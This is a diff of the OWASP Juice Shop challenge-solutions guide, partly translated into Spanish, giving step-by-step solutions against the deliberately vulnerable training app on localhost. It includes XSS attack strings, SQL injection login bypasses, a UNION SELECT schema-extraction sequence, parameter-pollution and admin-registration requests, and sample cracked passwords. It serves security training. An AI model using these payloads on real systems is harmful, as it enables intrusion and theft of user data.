@@ -1,61 +1,65 @@
-# :godmode: Apendice A - Soluciones del Desafio
+# Soluciones de los Desafios
 
-All URLs in the challenge solutions assume you are running the
-application locally and on the default port http://localhost:3000.
-Change the URL accordingly if you use a different root URL.
+Todas las URL en las soluciones de un desafío suponen que está
+ejecutando la aplicación localmente y en el puerto predeterminado
+http://localhost:3000 Si va a usar otra URL raíz, Ajuste y cambie la
+URL.
 
-Often there are multiple ways to solve a challenge. In most cases just
-one possible solution is presented here. This is typically the easiest
-or most obvious one from the author's perspective.
+A menudo hay múltiples formas de resolver un desafío. En la mayoría de
+los casos, aquí solo se presenta una posible solución. Esta es
+típicamente la más fácil u obvia desde la perspectiva del autor.
 
-_The challenge solutions found in this release of the companion guide
-are compatible with {{book.juiceShopVersion}} of OWASP Juice Shop._
+_Las soluciones de desafío que se encuentran en esta versión de la guía
+complementaria son compatibles con {{book.juiceShopVersion}} de OWASP
+Juice Shop._
 
-## Trivial Challenges (  :star:  )
+## ⭐ Desafios
 
-### Access a confidential document
+### Acceder a un documento confidencial
 
-1. Follow the link to titled _Check out our boring terms of use if you
-   are interested in such lame stuff_
-   (<http://localhost:3000/ftp/legal.md?md_debug=true>) on the _About
-   Us_ page.
-2. Successfully attempt to browse the directory by changing the URL into
+1. Siga el enlace titulado _Consulte nuestros aburridos términos de uso
+   si está interesado en este tipo de cosas aburridas_
+   (<http://localhost:3000/ftp/legal.md?md_debug=true>) en la página
+   Acerca de nosotros .
+
+2. Intente explorar todo el directorio cambiando la URL a
    <http://localhost:3000/ftp>
 
-   ![FTP directory browser](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/ftp_directory.png)
-3. Open <http://localhost:3000/ftp/acquisitions.md> to solve the
-   challenge.
+   ![FTP directory browser](img/ftp_directory.png)
+3. Abra <http://localhost:3000/ftp/acquisitions.md> para resolver el
+   desafío.
 
-### Provoke an error that is not very gracefully handled.
+### Al provocar un error, el manejo no es muy elegante
 
-Any request that cannot be properly handled by the server will
-eventually be passed to a global error handling component that sends an
-error page to the client that includes a stack trace and other sensitive
-information. The restful API behaves in a similar way, passing back a
-JSON error object with sensitive data, such as SQL query strings.
+Cualquier solicitud que no pueda ser manejada adecuadamente por el
+servidor eventualmente se pasará a un componente de manejo de errores
+global que envía una página de error al cliente que incluye un stack
+trace y otra información confidencial. La API restful se comporta de
+forma similar, devolviendo un objeto de error JSON con datos
+confidenciales, como textos de consulta SQL.
 
-Here are two examples (out of many different ways) to provoke such an
-error situation and solve this challenge immediately:
+Aquí hay dos ejemplos (de muchas maneras diferentes) para provocar tal
+situación de error y resolver este desafío de inmediato:
 
-* Visit <http://localhost:3000/rest/qwertz>
+* Visite <http://localhost:3000/rest/qwertz>
 
-  ![500 Error](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/error_page-500.png)
-* Log in to the application with `'` (single-quote) as _Email_ and
-  anything as _Password_
+  ![500 Error](img/error_page-500.png)
+* Inicie sesión en la aplicación con un nombre de correo '(comilla
+  simple) como _Email_ y cualquier cosa como _contraseña_
 
-  ![Object Error in Login form](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/login-error_js.png)
-  ![SQL error in JS console](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/error_js-console.png)
+  ![Object Error in Login form](img/login-error_js.png)
+  ![SQL error in JS console](img/error_js-console.png)
 
-### Read our privacy policy
+### Lea nuestra política de privacidad
 
-1. Log in to the application with any user.
-2. Open the dropdown menu on your profile picture and choose _Privacy &
-   Security_.
-3. You will find yourself on
-   <http://localhost:3000/#/privacy-security/privacy-policy> which
-   instantly solves this challenge for you.
+1. Inicie sesión en la aplicación con cualquier usuario.
+2. Abra el menú desplegable en su imagen de perfil y elija _Privacidad y
+   seguridad_.
+3. Usted se encontrará en la ubicación
+   <http://localhost:3000/#/privacy-security/privacy-policy> que
+   resuelve instantáneamente este desafío para usted.
 
-### Let us redirect you to a donation site that went out of business
+### Let us redirect you to one of our crypto currency addresses
 
 1. Log in to the application with any user.
 2. Visit the _Your Basket_ page and expand the _Payment_ and
@@ -64,92 +68,161 @@ error situation and solve this challenge immediately:
    parameter of the route `/redirect`
 4. Open `main.js` in your browser's DevTools
 5. Searching for `/redirect?to=` and stepping through all matches you
-   will notice one that does not appear on any (visible) button on the
-   _Your Basket_ page: `/redirect?to=https://gratipay.com/juice-shop`
+   will notice three functions that are called only from hidden buttons
+   on the _Your Basket_ page:
 
-   ![Gratipay commented out](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/gratipay-button-ngIf_false.png)
-6. Open
-   <http://localhost:3000/redirect?to=https://gratipay.com/juice-shop>
+   ![Hidden crypto currency link functions](img/cryptoLinks.png)
+6. Open one of the three, e.g.
+   <http://localhost:3000/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm>
    to solve the challenge.
 
-### Follow the DRY principle while registering a user
+### Siga el principio DRY mientras registra un usuario
 
-:wrench: **TODO**
+1. Go to <http://localhost:3000/#/register>.
+2. Fill out all required information except the _Password_ and _Repeat
+   Password_ field.
+3. Type e.g. `12345` into the _Password_ field.
+4. Now type `12345` into the _Repeat Password_ field. While typing the
+   numbers you will see a _Passwords do not match_ error until you reach
+   `12345`.
+5. Finally go back to the _Password_ field and change it into any other
+   password. The _Repeat Password_ field does not show the expected
+   error.
+6. Submit the form with _Register_ which will solve this challenge.
 
-### Find the carefully hidden 'Score Board' page
+### Encuentra la página oculta 'Score Board' que esta cuidadosamente escondida
 
-1. Go to the _Sources_ tab of your browsers DevTools and open the
-   `main.js` file.
-2. If your browser offers pretty-printing of this minified messy code,
-   best use this offer. In Chrome this can be done with the "{}"-button.
-3. Search for `score` and iterate through each finding to come across
-   one that looks like a route mapping section:
+1. Vaya a la pestaña Fuentes de su navegador DevTools y abra el archivo
+   `main.js`
+2. Si su navegador lo permite, prefiera una "vista bonita" de este
+   código minificado que esta "compactado y aplastado". En Chrome esto
+   se puede hacer con el botón "{}".
+3. Busque la palabra "score" avance a través de todos los hallazgo hasta
+   encontrar uno que se parezca a una sección de mapeo de ruta:
 
-   ![Route Mapping the the Score Board](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master//appendix/img/score-board_route.png)
-4. Navigate to http://localhost:3000/#/score-board to solve the
-   challenge.
-5. From now on you will see the additional menu item _Score Board_ in
-   the navigation bar.
+   ![Route Mapping the the Score Board](img/score-board_route.png)
+4. Para resolver este desafío, navegue hasta
+   http://localhost:3000/#/score-board
+5. A partir de ahora, verá el elemento de menu _Score Board_ como un
+   adicional en la barra de navegación.
 
-### Perform a reflected XSS attack
+### Realizar un ataque XSS reflejado.
 
-1. Log in as any user.
-2. Click the _Track Orders_ button.
-3. Paste the attack string ``<iframe src="javascript:alert(`xss`)">``
-   into the _Order ID_ field.
-4. Click the _Track_ button.
-5. An alert box with the text "xss" should appear.
+1. Inicia sesión como cualquier usuario.
+2. Haga clic en el botón _Rastrear Pedidos_
+3. En el campo ID de pedido, pegue la cadena de ataque ``<iframe
+   src="javascript:alert(`xss`)">``
+4. Haga click en el botón _Rastrear_
+5. Debe aparecer un cuadro de alerta con el texto "xss"
 
-   ![XSS alert box](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/xss0_alert.png)
+   ![XSS alert box](img/xss0_alert.png)
 
-### Perform a DOM XSS attack
+### Realizar un ataque DOM XSS.
 
-1. Paste the attack string ``<iframe src="javascript:alert(`xss`)">``
-   into the _Search..._ field.
-2. Click the _Search_ button.
-3. An alert box with the text "xss" should appear.
+1. En el campo _Buscar_, pegue la cadena de ataque: ``<iframe
+   src="javascript:alert(`xss`)">``
+2. Haga clic en el botón Buscar .
+3. Debe aparecer un cuadro de alerta con el texto "xss".
 
-   ![XSS alert box](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/xss1_alert.png)
+   ![XSS alert box](img/xss1_alert.png)
 
-### Give a devastating zero-star feedback to the store
+### Exfiltrate the entire DB schema definition via SQL Injection
 
-Place an order that makes you rich. Visit the _Contact Us_ form and put
-in a _Comment_ text. Also solve the CAPTCHA at the bottom of the form.
+1. From any errors seen during previous SQL Injection attempts you
+   should know that SQLite is the relational database in use.
+2. Check <https://www.sqlite.org/faq.html> to learn in "(7) How do I
+   list all tables/indices contained in an SQLite database" that the
+   schema is stored in a system table `sqlite_master`.
+3. You will also learn that this table contains a column `sql` which
+   holds the text of the original `CREATE TABLE` or `CREATE INDEX`
+   statement that created the table or index. Getting your hands on this
+   would allow you to replicate the entire DB schema.
+4. During the
+   [Order the Christmas special offer of 2014](#order-the-christmas-special-offer-of-2014)
+   challenge you learned that the `/rest/products/search` endpoint is
+   susceptible to SQL Injection into the `q` parameter.
+5. The attack payload you need to craft is a `UNION SELECT` merging the
+   data from the `sqlite_master` table into the products returned in the
+   JSON result.
+6. As a starting point we use the known working `'))--` attack pattern
+   and try to make a `UNION SELECT` out of it
+7. Searching for `')) UNION SELECT * FROM x--` fails with a
+   `SQLITE_ERROR: no such table: x` as you would expect.
+8. Searching for `')) UNION SELECT * FROM sqlite_master--` fails with a
+   promising `SQLITE_ERROR: SELECTs to the left and right of UNION do
+   not have the same number of result columns` which least confirms the
+   table name.
+9. The next step in a `UNION SELECT`-attack is typically to find the
+   right number of returned columns. As the _Search Results_ table in
+   the UI has 3 columns displaying data, it will probably at least be
+   three. You keep adding columns until no more `SQLITE_ERROR` occurs
+   (or at least it becomes a different one):
 
-1. The _Submit_ button is still **disabled** because you did not select
-   a _Rating_ yet.
-2. Inspect the _Submit_ button with your DevTools and note the
-   `disabled` attribute of the `<button>` HTML tag
-3. Double click on `disabled` attribute to select it and then delete it
-   from the tag.
+   1. `')) UNION SELECT '1' FROM sqlite_master--` fails with `number of
+      result columns` error
+   2. `')) UNION SELECT '1', '2' FROM sqlite_master--` fails with
+      `number of result columns` error
+   3. `')) UNION SELECT '1', '2', '3' FROM sqlite_master--` fails with
+      `number of result columns` error
+   4. (...)
+   5. `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8' FROM
+      sqlite_master--` _still fails_ with `number of result columns`
+      error
+   6. `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM
+      sqlite_master--` finally gives you a JSON response back with an
+      extra element
+      `{"id":"1","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"}`.
 
-   ![Disabled Submit Button in Contact Us form](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/contact_disabled_submit-button.png)
-4. The _Submit_ button is now **enabled**.
-5. Click the _Submit_ button to solve the challenge.
-6. You can verify the feedback was saved by checking the _Customer
-   Feedback_ widget on the _About Us_ page.
+10. Next you get rid of the unwanted product results changing the query
+    into something like `qwert')) UNION SELECT '1', '2', '3', '4', '5',
+    '6', '7', '8', '9' FROM sqlite_master--` leaving only the
+    "`UNION`ed" element in the result set
+11. The last step is to replace one of the fixed values with correct
+    column name `sql`, which is why searching for `qwert')) UNION SELECT
+    sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master--`
+    solves the challenge.
 
-   ![Zero star feedback in carousel](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/zero_star_feedback-carousel.png)
+### Califica la tienda con un devastador _Cero estrellas_
 
-## Easy Challenges (  :star::star:  )
+Haz un pedido que te haga rico. Visite el formulario _Contáctenos_ y
+escriba un _Texto_de_Comentario_ . También resuelva el CAPTCHA en la
+parte inferior del formulario.
 
-### Access the administration section of the store
+1. El botón _Enviar_ aún está **deshabilitado** porque todavía no
+   seleccionó una Calificación.
+2. Inspeccione el botón _Enviar_ con su DevTools y observe el atributo
+   `disabled` de la etiqueta HTML `<button>`
+3. Haga doble clic en el atributo `disabled` para seleccionarlo y luego
+   elimínelo de la etiqueta.
 
-1. Open the `main.js` in your browser's developer tools and search for
-   "admin".
-2. One of the matches will be a route mapping to `path:
-   "administration"`.
+   ![Disabled Submit Button in Contact Us form](img/contact_disabled_submit-button.png)
+4. El botón _Enviar_ ahora está **habilitado**
+5. Haga clic en el botón _Enviar_ para resolver el desafío.
+6. Puede verificar que los comentarios se guardaron consultando el
+   _Customer_Feedback_ widget del cliente en la página _Acerca de
+   nosotros_
 
-   ![Administration page route in main.js](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/minified_js-admin.png)
-3. Navigating to http://localhost:3000/#/administration will give a `403
-   Forbidden` error.
-4. Log in to an administrator's account by solving the challenge
-   * [Log in with the administrator's user account](#log-in-with-the-administrators-user-account)
-     or
-   * [Log in with the administrator's user credentials without previously changing them or applying SQL Injection](#log-in-with-the-administrators-user-credentials-without-previously-changing-them-or-applying-sql-injection)
-     first and then navigate to http://localhost:3000/#/administration
-     will solve the challenge.
+   ![Zero star feedback in carousel](img/zero_star_feedback-carousel.png)
 
+## ⭐⭐ Desafíos
+
+### Accede a la sección de administración de la tienda.
+
+1. En la herramientas de desarrollo de su navegador, abra el archivo
+   `main.js` y busque "admin".
+2. Uno de los hallazgos encontrados será un mapeo de ruta al path:
+   "administration".
+
+   ![Administration page route in main.js](img/minified_js-admin.png)
+3. Obtendrá un error `403 Forbidden`, al navegar en
+   http://localhost:3000/#/administration
+4. Inicia sesión en la cuenta de un administrador resolviendo el
+   desafío.
+   * [Inicie sesión con la cuenta de usuario del administrador](#log-in-with-the-administrators-user-account)
+     o
+   * [Inicie sesión con las credenciales de usuario del administrador sin cambiarlas previamente o aplicar la inyección SQL](#log-in-with-the-administrators-user-credentials-without-previously-changing-them-or-applying-sql-injection)
+     primero y entonces navegue al
+     <http://localhost:3000/#/administration> esto resolverá el desafio.
 
 ### View another user's shopping basket
 
@@ -158,7 +231,7 @@ in a _Comment_ text. Also solve the CAPTCHA at the bottom of the form.
 3. Inspect the _Session Storage_ in your browser's developer tools to
    find a numeric `bid` value.
 
-   ![Basket ID in Session Storage](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/session_storage.png)
+   ![Basket ID in Session Storage](img/session_storage.png)
 4. Change the `bid`, e.g. by adding or subtracting 1 from its value.
 5. Visit <http://localhost:3000/#/basket> to solve the challenge.
 
@@ -181,7 +254,7 @@ If the challenge is not immediately solved, you might have to
 6. In the `allowedMimeType` array you will notice `"application/xml"`
    and `"text/xml"` along with the expected PDF and ZIP types
 
-   ![Possible XML upload spoilered in main.js](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/complaint_xml_mime-type.png)
+   ![Possible XML upload spoilered in main.js](img/complaint_xml_mime-type.png)
 7. Click on the _Choose File_ button.
 8. In the _File Name_ field enter `*.xml` and select any arbitrary XML
    file (<100KB) you have available. Then press _Open_.
@@ -198,7 +271,7 @@ If the challenge is not immediately solved, you might have to
 2. Solve
    [Access the administration section of the store](#access-the-administration-section-of-the-store)
 
-   ![Feedback table on Administration page](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/customer_feedback-table.png)
+   ![Feedback table on Administration page](img/customer_feedback-table.png)
 3. Delete all entries with five star rating from the _Customer Feedback_
    table using the trashcan button
 
@@ -208,7 +281,7 @@ If the challenge is not immediately solved, you might have to
   authenticate the first entry in the `Users` table which coincidentally
   happens to be the administrator
 * or log in with _Email_ `admin@juice-sh.op'--` and any _Password_ if
-  you have already know the email address of the administrator
+  you already know the email address of the administrator
 * or log in with _Email_ `admin@juice-sh.op` and _Password_ `admin123`
   if you looked up the administrator's password hash
   `0192023a7bbd73250516f069df18b500` in a rainbow table after harvesting
@@ -238,7 +311,7 @@ If the challenge is not immediately solved, you might have to
    which is as easy to guess as it is to brute force or retrieve from a
    rainbow table.
 
-### Behave like any "white hat" should
+### Behave like any "white hat" should before getting into the action
 
 1. Visit <https://securitytxt.org/> to learn about a proposed standard
    which allows websites to define security policies.
@@ -290,15 +363,15 @@ in order to exploit and solve them:
    username into ``<script>alert(`xss`)</script>`` thus resulting in the
    expected alert box popping up.
 
-## Medium Challenges (  :star::star::star:  )
+## ⭐⭐⭐ Challenges
 
-###  Get registered as admin user
+###  Register as a user with administrator privileges
 
 1. Submit a `POST` request to <http://localhost:3000/api/Users> with:
    * `{"email":"admin","password":"admin","isAdmin":true}` as body
    * and `application/json` as `Content-Type`
 
-   ![Admin user registration request via Postman](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/register-admin_postman.png)
+   ![Admin user registration request via Postman](img/register-admin_postman.png)
 2. Upon your next visit to the application's web UI the challenge will
    be marked as solved.
 
@@ -316,17 +389,17 @@ in order to exploit and solve them:
    token in the request header.
 4. You will receive a (probably unexpected) response of `{'error' :
    'Invalid BasketId'}` - after all, it is not your basket!
-5. Change your `POST` request into utilizing HTTP Parameter Polution
+5. Change your `POST` request into utilizing HTTP Parameter Pollution
    (HPP) by supplying your own `BasketId` _and_ that of someone else in
    the same payload, i.e. `{"ProductId": 14,"BasketId": "1","quantity":
    1,"BasketId": "2"}`.
 6. Submitting this request will satisfy the validation based on your own
    `BasketId` but put the product into the other basket!
 
-:information_source: With other `BasketId`s you might need to play with
-the order of the duplicate property a bit and/or make sure your own
-`BasketId` is lower than the one of the target basket to make this HPP
-vulnerability work in your favor.
+ℹ️ With other `BasketId`s you might need to play with the order of the
+duplicate property a bit and/or make sure your own `BasketId` is lower
+than the one of the target basket to make this HPP vulnerability work in
+your favor.
 
 > Supplying multiple HTTP parameters with the same name may cause an
 > application to interpret values in unanticipated ways. By exploiting
@@ -338,7 +411,7 @@ vulnerability work in your favor.
 > Current HTTP standards do not include guidance on how to interpret
 > multiple input parameters with the same name. For instance, RFC 3986
 > simply defines the term Query String as a series of field-value pairs
-> and RFC 2396 defines classes of reversed and unreserved query string
+> and RFC 2396 defines classes of reserved and unreserved query string
 > characters. Without a standard in place, web application components
 > handle this edge case in a variety of ways (see the table below for
 > details).
@@ -439,11 +512,11 @@ if the CAPTCHA-pinning problem would be fixed in the application!_
    text field right at the top: `<input _ngcontent-c23 hidden
    id="userId" type="text" class="ng-untouched ng-pristine ng-valid">`
 
-   ![Hidden text field on Contact Us form](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/hidden_textfield.png)
+   ![Hidden text field on Contact Us form](img/hidden_textfield.png)
 3. In your browser's developer tools remove the `hidden` attribute from
    above `<input>` tag.
 
-   ![Spoofed feedback ready for submit](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/spoofed_feedback.png)
+   ![Spoofed feedback ready for submit](img/spoofed_feedback.png)
 4. The field should now be visible in your browser. Type any user's
    database identifier in there (other than your own if you are
    currently logged in) and submit the feedback.
@@ -454,7 +527,28 @@ logged out but provide any `UserId` in the JSON payload.
 
 ### Post a product review as another user or edit any user's existing review
 
-:wrench: **TODO**
+1. Select any product and write a review for it
+   ![Simple product review](img/normal_review.png)
+
+2. Submit the review while observing the `Networks` tab of your browser.
+
+3. Analyze the `PUT` request.
+   ![normal product request](img/normal_review_request.png)
+
+4. Change the author name to `admin@juice-sh.op` in `Request Body` and
+   re-send the request.
+
+### Log in with Chris' erased user account
+
+* Log in with _Email_ `chris.pike@juice-sh.op'--` and any _Password_ if
+  you already know the email address of Chris.
+* or log in with _Email_ as `\' or deletedAt IS NOT NULL--` and any
+  _Password_ you like for a "lucky hit" as Chris seems to be the only or
+  at least first ever deleted user. The presence of `deletedAt` you
+  might have derived from
+  [Retrieve a list of all user credentials via SQL Injection](#retrieve-a-list-of-all-user-credentials-via-sql-injection)
+  and enforcing it to be `NOT NULL` will give you back only users who
+  were soft-deleted at some point of time.
 
 ### Log in with Amy's original user credentials
 
@@ -474,7 +568,7 @@ logged out but provide any `UserId` in the JSON payload.
 ### Log in with Bender's user account
 
 * Log in with _Email_ `bender@juice-sh.op'--` and any _Password_ if you
-  have already know Bender's email address.
+  already know the email address of Bender.
 * A rainbow table attack on Bender's password will probably fail as it
   is rather strong. You can alternatively solve
   [Change Bender's password into _slurmCl4ssic_ without using SQL Injection or Forgot Password](#change-benders-password-into-slurmcl4ssic-without-using-sql-injection-or-forgot-password)
@@ -483,7 +577,7 @@ logged out but provide any `UserId` in the JSON payload.
 ### Log in with Jim's user account
 
 * Log in with _Email_ `jim@juice-sh.op'--` and any _Password_ if you
-  have already know Jim's email address.
+  already know the email address of Jim.
 * or log in with _Email_ `jim@juice-sh.op` and _Password_ `ncc-1701` if
   you looked up Jim's password hash in a rainbow table after harvesting
   the user data as described in
@@ -509,15 +603,15 @@ logged out but provide any `UserId` in the JSON payload.
    * and `Bearer ?` as `Authorization` header, replacing the `?` with
      the token you copied from the browser.
 
-   ![Negative quantity request body in PostMan](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/negative_order_postman-body.png)
+   ![Negative quantity request body in PostMan](img/negative_order_postman-body.png)
 8. Visit <http://localhost:3000/#/basket> to view _Your Basket_ with the
    negative quantity on the first item
 
-   ![Basket with negative item quantity](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/negative_order-basket.png)
+   ![Basket with negative item quantity](img/negative_order-basket.png)
 9. Click _Checkout_ to issue the negative order and solve this
    challenge.
 
-   ![Order confirmation with negative total](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/negative_order_pdf.pdf.png)
+   ![Order confirmation with negative total](img/negative_order_pdf.pdf.png)
 
 ### Prove that you actually read our privacy policy
 
@@ -525,7 +619,7 @@ logged out but provide any `UserId` in the JSON payload.
 2. Moving your mouse cursor over each paragraph will make a fire-effect
    appear on certain words or partial sentences.
 
-   ![Hot section in the privacy policy](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/privacy-policy_hot-section.png)
+   ![Hot section in the privacy policy](img/privacy-policy_hot-section.png)
 3. Inspect the HTML in your browser and note down all text inside `<span
    class="hot">` tags, which are `http://localhost`, `We may also`,
    `instruct you`, `to refuse all`, `reasonably necessary` and
@@ -543,7 +637,7 @@ only a `404 Error: ENOENT: no such file or directory, stat
 ### Change the href of the link within the O-Saft product description
 
 1. By searching for _O-Saft_ directly via the REST API with
-   <http://localhost:3000/rest/product/search?q=o-saft> you will learn
+   <http://localhost:3000/rest/products/search?q=o-saft> you will learn
    that it's database ID is `9`.
 2. Submit a `PUT` request to <http://localhost:3000/api/Products/9>
    with:
@@ -551,7 +645,7 @@ only a `404 Error: ENOENT: no such file or directory, stat
      target=\"_blank\">More...</a>"}` as body
    * and `application/json` as `Content-Type`
 
-   ![O-Saft link update via PostMan](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/osaft_postman-body.png)
+   ![O-Saft link update via PostMan](img/osaft_postman-body.png)
 
 ### Reset the password of Bjoern's OWASP account via the Forgot Password mechanism
 
@@ -578,20 +672,7 @@ The **user profile picture** of his account at
 <http://localhost:3000/assets/public/images/uploads/13.jpg> shows his
 pet cat playing.
 
-![Zaya playing](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/zaya.jpg)
-
-Furthermore, on Bjoern's **Patreon page** at
-<https://www.patreon.com/bkimminich> there is a locked post titled
-"Behind the scenes: Photo-bombed by Zaya" and tagged with the keyword
-"cat" which spoilers the pet's name.
-
-![Locked Patreon post mentioning Zaya](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/patreon_locked-post.png)
-
-Unlocking the post (by becoming a project patron) is not even necessary,
-but it would confirm the identity of the cat when comparing it with the
-user profile picture from before.
-
-![Unlocked Patreon post mentioning Zaya](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/patreon_unlocked-post.png)
+![Zaya playing](img/zaya.jpg)
 
 ### Reset Jim's password via the Forgot Password mechanism
 
@@ -606,11 +687,11 @@ user profile picture from before.
    * Another product review _"Fresh out of a replicator."_ on the _Green
      Smoothie_ product
    * A _Recycling Request_ with the address _"Starfleet HQ, 24-593
-     Federation Drive, San Francisco, CA"_ (:wrench: **TODO**)
+     Federation Drive, San Francisco, CA"_ (🔧 **TODO**)
 3. It should eventually become obvious that _James T. Kirk_ is the only
    viable solution to the question of Jim's identity
 
-   ![James T. Kirk](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/Star_Trek_William_Shatner.JPG)
+   ![James T. Kirk](img/Star_Trek_William_Shatner.JPG)
 4. Visit https://en.wikipedia.org/wiki/James_T._Kirk and read the
    [Depiction](https://en.wikipedia.org/wiki/James_T._Kirk#Depiction)
    section
@@ -622,7 +703,7 @@ user profile picture from before.
 8. Then type any _New Password_ and matching _Repeat New Password_
 9. Click _Change_ to solve this challenge
 
-   ![Password reset for Jim](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/jim_forgot-password.png)
+   ![Password reset for Jim](img/jim_forgot-password.png)
 
 ### Upload a file larger than 100 kB
 
@@ -631,20 +712,20 @@ user profile picture from before.
    form parameter `file` that contains a PDF file of more than 100 kB
    but less than 200 kB.
 
-   ![Larger file upload](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/invalid-size_upload.png)
+   ![Larger file upload](img/invalid-size_upload.png)
 3. The response from the server will be a `204` with no content, but the
    challenge will be successfully solved.
 
 Files larger than 200 kB are rejected by an upload size check on server
 side with a `500` error stating `Error: File too large`.
 
-### Upload a file that has no .pdf extension
+### Upload a file that has no .pdf or .zip extension
 
 1. Craft a `POST` request to <http://localhost:3000/file-upload> with a
    form parameter `file` that contains a non-PDF file with a size of
    less than 200 kB.
 
-   ![Non-PDF upload](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/invalid-type_upload.png)
+   ![Non-PDF upload](img/invalid-type_upload.png)
 2. The response from the server will be a `204` with no content, but the
    challenge will be successfully solved.
 
@@ -659,19 +740,19 @@ simultaneously.
      "xss"}` as body
    * and `application/json` as `Content-Type` header.
 
-   ![XSS request in PostMan](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/xss2_postman.png)
+   ![XSS request in PostMan](img/xss2_postman.png)
 2. Log in to the application with any user.
 3. Visit http://localhost:3000/#/administration.
 4. An alert box with the text "xss" should appear.
 
-   ![XSS alert box](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/xss2_alert.png)
+   ![XSS alert box](img/xss2_alert.png)
 5. Close this box. Notice the somewhat broken looking row in the
    _Registered Users_ table?
 6. Click the "eye"-button in that row.
 7. A modal overlay dialog with the user details opens where the attack
    string is rendered as harmless text.
 
-   ![XSS user in details dialog](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/xss2_user-modal.png)
+   ![XSS user in details dialog](img/xss2_user-modal.png)
 
 ### Perform a persisted XSS attack without using the frontend application at all
 
@@ -685,18 +766,18 @@ simultaneously.
    * and `Bearer ?` as `Authorization` header, replacing the `?` with
      the token you copied from the browser.
 
-   ![XSS request in PostMan](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/xss3_postman.png)
+   ![XSS request in PostMan](img/xss3_postman.png)
 4. Visit http://localhost:3000/#/search.
 5. An alert box with the text "xss" should appear.
 
-   ![XSS alert box](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/xss3_alert.png)
+   ![XSS alert box](img/xss3_alert.png)
 6. Close this box. Notice the product row which has a frame border in
    the description in the _All Products_ table
 7. Click the "eye"-button next to that row.
 8. Another alert box with the text "xss" should appear. After closing it
    the actual details dialog pops up showing the same frame border.
 
-   ![After closing the XSS alert box in product details](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/xss3_product-modal_alert.png)
+   ![After closing the XSS alert box in product details](img/xss3_product-modal_alert.png)
 
 ### Retrieve the content of C:\Windows\system.ini or /etc/passwd from the server
 
@@ -736,7 +817,7 @@ simultaneously.
 </trades>
 ```
 
-## Hard Challenges (  :star::star::star::star:  )
+## ⭐⭐⭐⭐ Challenges
 
 ### Gain access to any access log file of the server
 
@@ -759,33 +840,33 @@ simultaneously.
 5. Inside you will find at least one `access.log` of the current day.
    Open or download it to solve this challenge.
 
-   ![Exposed folder containing access logs](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/access-log_folder.png)
+   ![Exposed folder containing access logs](img/access-log_folder.png)
 
 ### Order the Christmas special offer of 2014
 
 1. Open http://localhost:3000/#/search and reload the page with `F5`
    while observing the _Network_ tab in your browser's DevTools
 2. Recognize the `GET` request
-   <http://localhost:3000/rest/product/search?q=> which returns the
+   <http://localhost:3000/rest/products/search?q=> which returns the
    product data.
 3. Submitting any SQL payloads via the _Search_ field in the navigation
    bar will do you no good, as it is only applying filters onto the
    entire data set what was retrieved with a singular call upon loading
    the page.
 4. In that light, the `q=` parameter on the
-   <http://localhost:3000/rest/product/search> endpoint would not even
+   <http://localhost:3000/rest/products/search> endpoint would not even
    be needed, but might be a relic from a different implementation of
    the search functionality. Test this theory by submitting
-   <http://localhost:3000/rest/product/searchq=orange> which should give
-   you a result such as
+   <http://localhost:3000/rest/products/searchq=orange> which should
+   give you a result such as
 
-   ![JSON search result for "orange" keyword](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/search-result_orange.png)
+   ![JSON search result for "orange" keyword](img/search-result_orange.png)
 5. Submit `';` as `q` via
-   <http://localhost:3000/rest/product/search?q=';>
+   <http://localhost:3000/rest/products/search?q=';>
 6. You will receive an error page with a `SQLITE_ERROR: syntax error`
    mentioned, indicating that SQL Injection is indeed possible.
 
-   ![SQL search query syntax error](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/search-error_sql-syntax.png)
+   ![SQL search query syntax error](img/search-error_sql-syntax.png)
